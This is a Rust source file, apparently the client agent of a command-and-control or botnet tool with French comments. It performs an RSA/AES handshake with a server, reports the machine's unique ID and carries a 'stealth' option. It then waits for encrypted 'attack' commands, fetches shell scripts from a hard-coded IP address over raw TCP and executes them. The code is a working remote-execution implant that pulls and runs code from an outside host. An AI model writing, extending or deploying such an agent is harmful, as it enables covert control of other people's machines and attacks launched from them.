mod connexion;

use std::borrow::Borrow;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::thread;
use std::str;
use std::sync::mpsc;

// Handshake
use rsa::{RsaPublicKey, RsaPrivateKey, Pkcs1v15Encrypt};
use rsa::pkcs8::{EncodePublicKey, LineEnding};
use rand::rngs::OsRng;
use serde_json;

use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
use serde::{Deserialize, Serialize};
use generic_array::GenericArray;
use base64::{Engine as _, engine::general_purpose};
use std::fs::{self, File};
use std::path::Path;

type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;

// JSON config handshake
#[derive(Serialize, Deserialize)]
struct HandshakeConfJson {
    action: String,
    b64symetric: String,
    b64iv: String,
    multithread: bool,
    stealth: bool,
}

// JSON attack
#[derive(Serialize, Deserialize)]
pub struct DataReceived {
    pub(crate) id: String,
    pub(crate) attack: String,
    pub(crate) arg1: String,
    pub(crate) arg2:String,
    pub(crate) arg3:String
}

pub(crate) fn receive_data_json_to_str(data: String) -> Result<DataReceived, serde_json::Error> {
   match serde_json::from_str::<DataReceived>(&data) {
       Ok(data) => Ok(data),
       Err(err) => {
           eprintln!("Error parsing JSON data: {:?}", err);
           Err(err)
       }
   }
}

fn json_to_struct_handshake_stc(data: String) -> HandshakeConfJson {
    serde_json::from_str::<HandshakeConfJson>(&data).expect("Erreur JSON")
}

fn struct_to_json_handshake_stc(data: HandshakeConfJson) -> String {
    serde_json::to_string(&data).unwrap()
}

fn send_encrypted_data_to_server(
    sender: mpsc::Sender<Vec<u8>>,
    data: String,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
) {
    let data_as_bytes = data.as_bytes().to_vec();
    let mut buffer = vec![0u8; data_as_bytes.len() + 16]; // Adjust buffer size
    let encrypted_data = Aes128CbcEnc::new(&symetric_key, &iv)
        .encrypt_padded_b2b_mut::<Pkcs7>(&data_as_bytes, &mut buffer)
        .unwrap();

    if sender.send(encrypted_data.to_vec()).is_err() {
        eprintln!("Error sending data");
    }
}

fn receive_encrypted_data_from_server(
    receiver: &mpsc::Receiver<Vec<u8>>,
    symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
    iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
) -> String {
    match receiver.recv() {
        Ok(data) => {
            println!("Data received successfully!");

            // println!("Data received: {:?}", data);

            let mut buffer = vec![0u8; data.len() + 16];
            match Aes128CbcDec::new(&symetric_key, &iv)
                .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buffer)
            {
                Ok(decrypted_data) => match str::from_utf8(decrypted_data) {
                    Ok(utf8_data) => utf8_data.to_string(),
                    Err(err) => {
                        eprintln!("Error converting data to UTF-8: {:?}", err);
                        String::new()
                    }
                },
                Err(err) => {
                    eprintln!("Error decrypting data: {:?}", err);
                    String::new()
                }
            }
        }
        Err(err) => {
            eprintln!("Error while receiving data: {:?}", err);
            String::new()
        }
    }
}



fn check_and_request_executable(
    executable_name: &str,
    executable_dir: &str,
    sender: &mpsc::Sender<Vec<u8>>,
    symetric_key: &GenericArray<u8, typenum::consts::U16>,
    iv: &GenericArray<u8, typenum::consts::U16>,
) -> io::Result<()> {
    let executable_path = Path::new(executable_dir).join(executable_name).with_extension("sh");
    println!("Checking if executable exists at {:?}", executable_path);

    if !executable_path.exists() {
        println!("Executable not found, requesting from server...");

        let request_message = format!("REQUEST_EXECUTABLE {}", executable_name);
        send_encrypted_data_to_server(sender.clone(), request_message, symetric_key.clone(), iv.clone());

        // Receive the executable file
        let mut buffer = [0u8; 1024];
        let mut file = File::create(&executable_path)?;

        let mut stream = TcpStream::connect("51.77.193.65:4242")?;

        loop {
            let bytes_read = stream.read(&mut buffer)?;
            if bytes_read == 0 {
                break;
            }
            file.write_all(&buffer[..bytes_read])?;
        }

        println!("Executable received and stored at {:?}", executable_path);
    } else {
        println!("Executable found at {:?}", executable_path);
        send_encrypted_data_to_server(sender.clone(), "YES".to_string(), symetric_key.clone(), iv.clone());
    }

    Ok(())
}

fn execute_attack(
    attack_name: &str,
    sender: &mpsc::Sender<Vec<u8>>,
    symetric_key: &GenericArray<u8, typenum::consts::U16>,
    iv: &GenericArray<u8, typenum::consts::U16>,
) -> io::Result<()> {
    let executable_dir = "./actions";

    check_and_request_executable(attack_name, executable_dir, sender, symetric_key, iv)?;

    let executable_path = Path::new(executable_dir).join(attack_name);
    std::process::Command::new(executable_path).spawn()?.wait()?;

    Ok(())
}

fn main() -> io::Result<()> {
    // Connexion
    let connexion: TcpStream = connexion::connexion()?;
    let connexion2: TcpStream = connexion.try_clone()?;

    // thread emission
    let (sender, rx) = mpsc::channel::<Vec<u8>>();
    let sender_clone = sender.clone();
    let _thread_emission = thread::spawn(move || {
        connexion::emission(connexion, rx);
    });

    // thread reception
    let (tx2, receiver) = mpsc::channel::<Vec<u8>>();
    let _thread_reception = thread::spawn(move || {
        connexion::reception(connexion2, tx2);
    });

    // ========== HANDSHAKE ==========

    // Génération de la paire de clés RSA
    let mut rng = OsRng;
    let bits = 2048;
    let private_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let public_key = RsaPublicKey::from(&private_key);

    let pkcs1_encoded_public_pem = public_key.to_public_key_pem(LineEnding::LF).unwrap();

    // Envoi de la clé publique au serveur python
    sender.send(pkcs1_encoded_public_pem.as_bytes().to_vec()).unwrap();

    // Réception de la clé symétrique chiffrée
    let encrypted_hanshake_data = receiver.recv().unwrap();

    // Déchiffrement de la clé symétrique
    let decrypted_data = private_key.decrypt(Pkcs1v15Encrypt, &encrypted_hanshake_data).unwrap();

    let handshake_data = json_to_struct_handshake_stc(str::from_utf8(decrypted_data.as_slice()).unwrap().to_string());

    let _stealth_mode = handshake_data.stealth;
    let _multithread_mode = handshake_data.multithread;

    // Decode the base64 key
    let symetric_key;
    match general_purpose::STANDARD.decode(handshake_data.b64symetric.as_bytes()) {
        Ok(decoded_sym_key) => {
            symetric_key = GenericArray::clone_from_slice(&decoded_sym_key);
        }
        Err(err) => {
            eprintln!("Error decoding base64 symetric key: {}", err);
            symetric_key = GenericArray::default();
        }
    };

    // Decode the base64 iv
    let iv;
    match general_purpose::STANDARD.decode(handshake_data.b64iv.as_bytes()) {
        Ok(decoded_iv) => {
            iv = GenericArray::clone_from_slice(&decoded_iv);
        }
        Err(err) => {
            eprintln!("Error decoding base64 iv: {}", err);
            iv = GenericArray::default();
        }
    };

    let uid = machine_uid::get().unwrap();

    let handshake_response = format!("{{\"action\":\"client_config\",\"uid\":\"{}\"}}", uid);

    send_encrypted_data_to_server(sender.clone(), handshake_response, symetric_key.clone(), iv.clone());

    // ========== END HANDSHAKE ==========

    let thread_test = thread::spawn(move || {
        let mut response = String::new();

        loop {
            let message = receive_encrypted_data_from_server(&receiver, symetric_key.clone(), iv.clone());
            if let Ok(json_message) = receive_data_json_to_str(message.clone()) {
                println!("Type d'attaque : {:?}", json_message.attack);
            if !message.is_empty() {
                println!("Received command: {}", message);
                match execute_attack(&json_message.attack, &sender, &symetric_key, &iv) {
                    Ok(_) => {
                        response = format!("{{\"status\":\"success\",\"action\":\"{}\"}}", message);
                        send_encrypted_data_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
                    }
                    Err(e) => {
                        response = format!("{{\"status\":\"error\",\"action\":\"{}\",\"error\":\"{}\"}}", message, e);
                        send_encrypted_data_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
                    }
                }
            }
        }
    }
    });

    loop {
        let mut input = String::new();
        println!("Entrez un message : ");
        match io::stdin().read_line(&mut input) {
            Ok(_) => {
                println!("{}", input);
                send_encrypted_data_to_server(sender_clone.clone(), input, symetric_key.clone(), iv.clone());
            }
            Err(error) => println!("error: {}", error),
        }
    }
}
